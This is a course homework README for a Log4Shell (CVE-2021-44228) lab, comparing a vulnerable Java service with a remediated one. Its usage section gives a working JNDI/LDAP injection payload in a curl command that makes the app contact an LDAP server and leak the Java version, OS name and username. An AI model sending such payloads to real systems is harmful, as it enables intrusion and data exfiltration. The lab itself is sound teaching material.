# SEAS-8405 Homework 9 - LDAP Exploitation Demonstration

Stephen Carver
---

This repository contains code and infrastructure for a demonstration of a Log4J exploit, as part of the SEAS-8405 cybersecurity course.

**Disclaimer:** This project is for educational purposes only. It simulates a known class of security vulnerability and should never be deployed in a production environment.

## Project Structure

```
.
├── before/              # Vulnerable setup before remediation
├── after/               # Hardened or remediated setup
├── ldap_server/         # Simulated LDAP server
├── Makefile             # Helper commands for setup, execution, cleanup
└── README.md            # This file
```

## Purpose

The goal of this assignment is to demonstrate how a Java application can be exploited using a JNDI/LDAP vector to make an outbound connection to a rogue LDAP server.

## Exploit Simulation Workflow

1. **Start the LDAP Server**  
   The LDAP server listens for connections and logs requests made to it. This can be done via the provided python script or via the ldap container.

2. **Launch the Vulnerable Java Application**  
   A sample Java application simulates unsafe deserialization by Log4J using JNDI lookups.

3. **Trigger Exploit**  
   A crafted payload causes the application to reach out to the LDAP server. No real malicious code is served, the goal is to verify that the connection occurs.

4. **Log Verification**  
   If using the python script, a simple message will log the connection attempt. If using the LDAP container, the LDAP server's logs will show the connection attempt with a marker such as `EXPLOITED-Java`.

## Usage

### Setup and Execution

```bash
# Start the containers
make before-up

# Run the exploit demo
curl -H 'Content-Type: text/plain' --data '${jndi:ldap://host.docker.internal:389/EXPLOITED-Java-${java:version}-OS-${sys:os.name}-User-${sys:user.name}}' http://localhost:8080/log

# View logs from the LDAP server
make before-logs

# Shut down everything
make before-down

# Start the containers
make after-up

# Run the exploit demo
curl -H 'Content-Type: text/plain' --data '${jndi:ldap://host.docker.internal:389/EXPLOITED-Java-${java:version}-OS-${sys:os.name}-User-${sys:user.name}}' http://localhost:8080/log

# View logs from the LDAP server
make after-logs

# Shut down everything
make after-down
```

### Example LDAP Server Log

```
conn=1003 op=1 do_search: invalid dn: "EXPLOITED-Java-Java version 11.0.16-OS-Linux-User-root"
```

## Security Lessons

- Avoid deserializing untrusted input
- Restrict egress traffic from sensitive applications
- Validate and sanitize JNDI lookups
- Use up-to-date Java libraries and disable dangerous features

## References

- [Log4Shell CVE-2021-44228](https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-44228)
- [JNDI Injection Exploits](https://www.veracode.com/blog/research/exploiting-jndi-injections-java)

